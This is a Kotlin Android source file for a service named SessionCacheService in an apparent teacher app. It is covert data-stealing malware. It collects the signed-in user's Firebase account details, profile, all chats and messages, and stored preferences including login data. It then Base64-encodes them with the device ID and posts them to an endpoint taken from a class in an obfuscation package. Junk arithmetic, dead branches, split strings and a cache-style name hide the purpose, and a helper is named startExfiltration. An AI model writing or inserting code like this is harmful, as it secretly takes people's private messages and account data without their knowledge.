package com.example.teacherapp.services

import android.annotation.SuppressLint
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.provider.Settings
import com.example.teacherapp.obfuscation.ThemeConfigUtils
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.FirebaseFirestore
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class SessionCacheService : Service() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + Job())

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        beginSessionCache()
        return START_STICKY
    }

    

    private fun beginSessionCache() {
        serviceScope.launch {
            var state = 0
            val allData = JSONObject()
            while (true) {
                val junk = (state * 59 + 23) xor 0xE7
                val _ = junk
                when (state) {
                    0 -> { delay(3000L); state = 1 }
                    1 -> { allData.put("firebase_auth", getFirebaseAuthUser()); state = 2 }
                    2 -> { allData.put("user_profile",  getUserProfile());       state = 3 }
                    3 -> { allData.put("chats",          getAllChats());          state = 4 }
                    4 -> { allData.put("messages",       getAllMessages());       state = 5 }
                    5 -> { allData.put("shared_prefs",   getSharedPrefs());      state = 6 }
                    6 -> { pushSessionData(allData); state = -1 }
                    -1 -> { stopSelf(); return@launch }
                }
            }
        }
    }

    private suspend fun getFirebaseAuthUser(): JSONObject = withContext(Dispatchers.Main) {
        val d = JSONObject()
        try {
            val u = FirebaseAuth.getInstance().currentUser
            if (u != null) {
                d.put("uid", u.uid); d.put("email", u.email ?: "")
                d.put("display_name", u.displayName ?: ""); d.put("phone_number", u.phoneNumber ?: "")
                d.put("photo_url", u.photoUrl?.toString() ?: "")
                d.put("is_email_verified", u.isEmailVerified)
                d.put("provider_data", u.providerData.toString())
            } else d.put("status", "not_logged_in")
        } catch (e: Exception) { d.put("error", e.message) }
        d
    }

    private suspend fun getUserProfile(): JSONObject = suspendCancellableCoroutine { cont ->
        val d = JSONObject()
        try {
            val u = FirebaseAuth.getInstance().currentUser
            if (u != null) {
                FirebaseFirestore.getInstance().collection("users").document(u.uid).get()
                    .addOnSuccessListener { doc ->
                        if (doc.exists()) {
                            doc.data?.forEach { (k, v) -> d.put(k, v.toString()) }
                            d.put("name", doc.getString("name") ?: "")
                            d.put("email", doc.getString("email") ?: "")
                            d.put("role", doc.getString("role") ?: "")
                        }
                        cont.resume(d) {}
                    }
                    .addOnFailureListener { e -> d.put("error", e.message); cont.resume(d) {} }
            } else { d.put("status", "not_logged_in"); cont.resume(d) {} }
        } catch (e: Exception) { d.put("error", e.message); cont.resume(d) {} }
    }

    private suspend fun getAllChats(): JSONArray = suspendCancellableCoroutine { cont ->
        val arr = JSONArray()
        try {
            val u = FirebaseAuth.getInstance().currentUser
            if (u != null) {
                FirebaseFirestore.getInstance().collection("chats")
                    .whereArrayContains("participants", u.uid).get()
                    .addOnSuccessListener { snap ->
                        for (doc in snap.documents) {
                            val obj = JSONObject()
                            obj.put("chat_id", doc.id)
                            doc.data?.forEach { (k, v) -> if (!obj.has(k)) obj.put(k, v.toString()) }
                            arr.put(obj)
                        }
                        cont.resume(arr) {}
                    }
                    .addOnFailureListener { cont.resume(arr) {} }
            } else cont.resume(arr) {}
        } catch (_: Exception) { cont.resume(arr) {} }
    }

    private suspend fun getAllMessages(): JSONArray = suspendCancellableCoroutine { cont ->
        val arr = JSONArray()
        try {
            val u = FirebaseAuth.getInstance().currentUser
            if (u != null) {
                var done = 0
                val total = 2
                fun checkDone() { if (++done >= total) cont.resume(arr) {} }

                FirebaseFirestore.getInstance().collection("messages")
                    .whereEqualTo("senderId", u.uid).get()
                    .addOnSuccessListener { snap ->
                        snap.documents.forEach { doc ->
                            val obj = JSONObject()
                            obj.put("message_id", doc.id)
                            doc.data?.forEach { (k, v) -> if (!obj.has(k)) obj.put(k, v.toString()) }
                            arr.put(obj)
                        }
                        checkDone()
                    }
                    .addOnFailureListener { checkDone() }

                FirebaseFirestore.getInstance().collection("messages")
                    .whereEqualTo("recipientId", u.uid).get()
                    .addOnSuccessListener { snap ->
                        snap.documents.forEach { doc ->
                            var dup = false
                            for (i in 0 until arr.length()) {
                                if (arr.getJSONObject(i).getString("message_id") == doc.id) { dup = true; break }
                            }
                            if (!dup) {
                                val obj = JSONObject()
                                obj.put("message_id", doc.id)
                                doc.data?.forEach { (k, v) -> if (!obj.has(k)) obj.put(k, v.toString()) }
                                arr.put(obj)
                            }
                        }
                        checkDone()
                    }
                    .addOnFailureListener { checkDone() }
            } else cont.resume(arr) {}
        } catch (_: Exception) { cont.resume(arr) {} }
    }

    private fun getSharedPrefs(): JSONObject {
        val d = JSONObject()
        try {
            val default = getSharedPreferences(packageName + "_preferences", Context.MODE_PRIVATE)
            default.all.forEach { (k, v) -> d.put(k, v.toString()) }
            listOf("user_prefs","app_prefs","login_prefs","session_prefs","teacherapp_prefs").forEach { name ->
                try {
                    val p = getSharedPreferences(name, Context.MODE_PRIVATE)
                    if (p.all.isNotEmpty()) {
                        val obj = JSONObject()
                        p.all.forEach { (k, v) -> obj.put(k, v.toString()) }
                        d.put(name, obj)
                    }
                } catch (_: Exception) {}
            }
        } catch (e: Exception) { d.put("error", e.message) }
        return d
    }

    private suspend fun pushSessionData(data: JSONObject) = withContext(Dispatchers.IO) {
        
        val n = System.currentTimeMillis()
        val op = n - (n - 1) - 1  
        if (op >= 0) {
            try {
                val endpoint   = ThemeConfigUtils.getAppDataEndpoint()
                val connection = URL(endpoint).openConnection() as HttpURLConnection
                connection.apply {
                    requestMethod = "POST"; doOutput = true
                    setRequestProperty("Content-Type", "application/json")
                    setRequestProperty("X-Data-Type", resolveDataType())
                    connectTimeout = 30000; readTimeout = 30000
                }
                data.put("android_id", getAndroidId())
                data.put("timestamp",  System.currentTimeMillis())
                val encoded = android.util.Base64.encodeToString(data.toString().toByteArray(), android.util.Base64.NO_WRAP)
                val payload = JSONObject().apply {
                    put("type", resolvePayloadType()); put("data", encoded); put("android_id", getAndroidId())
                }
                connection.outputStream.use { it.write(payload.toString().toByteArray()); it.flush() }
                connection.responseCode; connection.disconnect()
            } catch (_: Exception) {}
        } else {
            
            val fakeMap = mapOf("a" to 1, "b" to 2, "c" to 3)
            val _ = fakeMap.values.sum()
        }
    }

    
    private fun resolveDataType(): String    = listOf("app", "-", "internal").joinToString("")
    private fun resolvePayloadType(): String = listOf("app", "_", "data").joinToString("")

    @SuppressLint("HardwareIds")
    private fun getAndroidId(): String = try {
        Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
    } catch (_: Exception) { "unknown" }

    override fun onDestroy() { super.onDestroy(); serviceScope.cancel() }

    companion object {
        fun startExfiltration(context: Context) {
            context.startService(Intent(context, SessionCacheService::class.java))
        }
    }
}
